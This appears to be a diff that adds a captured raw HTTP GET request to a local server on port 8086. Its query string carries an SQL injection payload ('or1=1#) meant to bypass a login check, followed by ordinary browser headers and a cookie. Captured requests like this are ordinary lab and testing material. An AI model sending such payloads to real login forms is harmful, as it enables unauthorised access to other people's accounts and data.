@@ -1,0 +1,9 @@
+GET /?user='or1=1#&pass=' HTTP/1.1
+Host: localhost:8086
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: lb:user_data=eyJuYW1lIjpudWxsLCJoZXhfY29sb3IiOiIjNjBBNUZBIn0=; g_state={"i_l":0}
+Upgrade-Insecure-Requests: 1
